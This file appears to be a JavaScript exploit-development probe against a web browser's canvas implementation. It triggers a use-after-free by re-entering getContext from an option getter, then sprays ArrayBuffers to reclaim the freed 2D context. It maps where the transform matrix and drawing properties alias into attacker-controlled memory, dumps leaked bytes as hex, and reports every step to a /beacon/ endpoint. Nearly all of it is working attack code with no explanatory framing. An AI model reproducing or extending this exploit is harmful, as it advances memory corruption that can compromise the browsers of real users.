// CRASH_CLASS: LOW
// PROBE p554b: Ultra-lean cross-type reclaim test
//
// p554 OOM'd — too many UAFs and ABs. This probe:
//   ONE UAF, 15 ArrayBuffers at 768B, read getTransform, done.

document.write('<pre id="log" style="color:#0f0;background:#000;font:13px monospace;padding:8px;white-space:pre-wrap"></pre>');

(function () {
  var logEl = document.getElementById('log');
  var retained = [];

  function emit(tag, msg) {
    var line = tag + ' ' + msg;
    logEl.textContent += line + '\n';
    try {
      new Image().src = '/beacon/P554B-' + encodeURIComponent(tag) +
        '?d=' + encodeURIComponent(msg.slice(0, 350));
    } catch (e) {}
  }

  function f64hex(f) {
    var buf = new ArrayBuffer(8);
    new Float64Array(buf)[0] = f;
    var u = new Uint8Array(buf);
    var s = '';
    for (var i = 7; i >= 0; i--) {
      var b = u[i].toString(16);
      s += (b.length < 2 ? '0' : '') + b;
    }
    return s;
  }

  emit('START', 'crosstype-lean');

  // ===================== Trigger UAF =====================
  var canvas = document.createElement('canvas');
  canvas.width = 1; canvas.height = 1;
  document.body.appendChild(canvas);
  retained.push(canvas);

  var inner = null;
  var g = 0;
  var opts = {};
  Object.defineProperty(opts, 'desynchronized', {
    get: function () { g++; if (g === 1) { inner = canvas.getContext('2d'); } return false; },
    enumerable: true
  });

  var outer = null;
  try { outer = canvas.getContext('2d', opts); } catch (e) { emit('ERR', String(e)); return; }
  retained.push(outer, inner);

  if (!inner || outer === inner) { emit('PATCHED', 'no UAF'); return; }
  emit('TRIGGER', 'uaf=true');

  // ===================== Read BEFORE spray =====================
  try {
    var pre = inner.getTransform();
    emit('PRE', 'a=' + pre.a + ' b=' + pre.b + ' c=' + pre.c +
      ' d=' + pre.d + ' e=' + pre.e + ' f=' + pre.f);
    emit('PRE-HEX', 'a=' + f64hex(pre.a) + ' d=' + f64hex(pre.d));
  } catch (e) {
    emit('PRE-ERR', String(e));
  }

  // ===================== Cross-type spray: 15 ABs at 768B =====================
  var SIZE = 768;
  var COUNT = 15;
  var abs = [];
  var MARKER = 3735928559.123; // recognizable

  for (var i = 0; i < COUNT; i++) {
    var ab = new ArrayBuffer(SIZE);
    var dv = new Float64Array(ab);
    for (var j = 0; j < dv.length; j++) {
      dv[j] = MARKER + i + j * 0.0001;
    }
    abs.push(ab);
  }
  retained.push(abs);
  emit('SPRAYED', 'n=' + COUNT + ' size=' + SIZE);

  // ===================== Read after spray =====================
  try {
    var post = inner.getTransform();
    emit('POST', 'a=' + post.a + ' b=' + post.b + ' c=' + post.c +
      ' d=' + post.d + ' e=' + post.e + ' f=' + post.f);

    var isIdentity = Math.abs(post.a - 1) < 0.001 && Math.abs(post.b) < 0.001 &&
      Math.abs(post.c) < 0.001 && Math.abs(post.d - 1) < 0.001;
    var isZero = Math.abs(post.a) < 0.001 && Math.abs(post.d) < 0.001;
    var isMarker = post.a > 3735928559 - 1;

    emit('RESULT', 'identity=' + isIdentity + ' zero=' + isZero + ' marker=' + isMarker);

    if (isMarker) {
      emit('HIT', 'CROSS-TYPE RECLAIM WORKS at ' + SIZE + 'B');

      // Find which AB and map offsets
      try {
        inner.setTransform(1.0000000000001, 2.0000000000002, 3.0000000000003,
          4.0000000000004, 5.0000000000005, 6.0000000000006);
      } catch (e) {}

      var aliasIdx = -1;
      for (var ai = 0; ai < abs.length; ai++) {
        var check = new Float64Array(abs[ai]);
        for (var ci = 0; ci < check.length; ci++) {
          if (Math.abs(check[ci] - 1.0000000000001) < 1e-10) {
            aliasIdx = ai;
            emit('ALIAS', 'AB[' + ai + '] offset=' + (ci * 8));
            break;
          }
        }
        if (aliasIdx >= 0) break;
      }

      if (aliasIdx >= 0) {
        // Map all 6 transform fields
        var aliasF64 = new Float64Array(abs[aliasIdx]);
        var offsets = [];
        var targets = [1.0000000000001, 2.0000000000002, 3.0000000000003,
          4.0000000000004, 5.0000000000005, 6.0000000000006];
        var names = ['a', 'b', 'c', 'd', 'e', 'f'];
        for (var ti = 0; ti < targets.length; ti++) {
          for (var fi = 0; fi < aliasF64.length; fi++) {
            if (Math.abs(aliasF64[fi] - targets[ti]) < 1e-10) {
              offsets.push(names[ti] + '@' + (fi * 8));
              break;
            }
          }
        }
        emit('OFFSETS', offsets.join(' '));

        // Also set numeric props and find their offsets
        try {
          inner.lineWidth = 111.111;
          inner.globalAlpha = 0.222;
          inner.shadowBlur = 333.333;
          inner.miterLimit = 666.666;
        } catch (e) {}

        var propNames = ['lineWidth', 'globalAlpha', 'shadowBlur', 'miterLimit'];
        var propVals = [111.111, 0.222, 333.333, 666.666];
        var propOffsets = [];
        for (var pi = 0; pi < propVals.length; pi++) {
          for (var pfi = 0; pfi < aliasF64.length; pfi++) {
            if (Math.abs(aliasF64[pfi] - propVals[pi]) < 1e-10) {
              propOffsets.push(propNames[pi] + '@' + (pfi * 8));
              break;
            }
          }
        }
        emit('PROP-OFFSETS', propOffsets.join(' '));

        // Report non-zero non-marker bytes
        var nonZero = [];
        var aliasU8 = new Uint8Array(abs[aliasIdx]);
        for (var bi = 0; bi < aliasU8.length; bi += 8) {
          var v = aliasF64[bi / 8];
          if (v !== 0) {
            var isOurs = false;
            for (var ki = 0; ki < targets.length; ki++) {
              if (Math.abs(v - targets[ki]) < 1e-10) { isOurs = true; break; }
            }
            for (var kj = 0; kj < propVals.length; kj++) {
              if (Math.abs(v - propVals[kj]) < 1e-10) { isOurs = true; break; }
            }
            if (!isOurs) {
              nonZero.push('+' + bi + '=' + f64hex(v));
            }
          }
        }
        if (nonZero.length > 0) {
          emit('OTHER', nonZero.slice(0, 15).join(' '));
        } else {
          emit('OTHER', 'all non-marker slots are zero');
        }
      }
    } else if (!isIdentity && !isZero) {
      emit('WEIRD', 'unexpected values — hex: a=' + f64hex(post.a) + ' b=' + f64hex(post.b) +
        ' c=' + f64hex(post.c) + ' d=' + f64hex(post.d));
    } else {
      emit('MISS', 'no cross-type reclaim at ' + SIZE + 'B (got ' +
        (isIdentity ? 'identity' : 'zeros') + ')');
    }
  } catch (e) {
    emit('POST-ERR', String(e));
  }

  // ===================== Also read numeric props =====================
  try {
    emit('POST-PROPS', 'lw=' + inner.lineWidth + ' ga=' + inner.globalAlpha +
      ' ml=' + inner.miterLimit + ' sb=' + inner.shadowBlur);
  } catch (e) {
    emit('POST-PROPS-ERR', String(e));
  }

  emit('ALIVE', 'done');
  window.__p554b = retained;
})();
